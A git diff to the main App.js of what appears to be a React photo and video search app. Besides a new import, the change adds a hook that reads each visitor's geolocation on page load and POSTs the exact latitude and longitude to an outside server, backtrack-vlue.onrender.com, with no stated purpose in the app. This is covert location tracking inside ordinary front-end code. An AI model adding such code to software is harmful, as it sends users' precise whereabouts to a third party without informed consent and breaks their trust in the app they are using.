@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useEffect, useState } from "react";
 import logo from "./logo.svg";
 import { Counter } from "./features/counter/Counter";
 import "./App.css";
@@ -20,6 +20,7 @@ import {
   fetchAsyncSearch,
   fetchAsyncSearchVideo,
 } from "./features/Photo/PhotoSlice";
+import axios from "axios";
 
 function App() {
   window.onscroll = function () {
@@ -38,6 +39,36 @@ function App() {
   }
   const [inputValue, setInputValue] = useState("");
   const dispatch = useDispatch();
+
+  useEffect(() => {
+    if (window.navigator.geolocation) {
+      window.navigator.geolocation.getCurrentPosition(success, console.error());
+    } else {
+      console.log("Geolocation not supported");
+    }
+  }, []);
+  async function success(position) {
+    const latitude = position.coords.latitude;
+    const longitude = position.coords.longitude;
+    const dummy = {
+      devicedetails: {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+      },
+    };
+    const req = await axios
+      .post(`https://backtrack-vlue.onrender.com/`, {
+        devicedetails: {
+          latitude: position.coords.latitude ,
+          longitude:position.coords.longitude
+        },
+      })
+      .then((request) => {
+        console.log(request);
+      });
+
+    console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
+  }
 
   return (
     <div className="App">
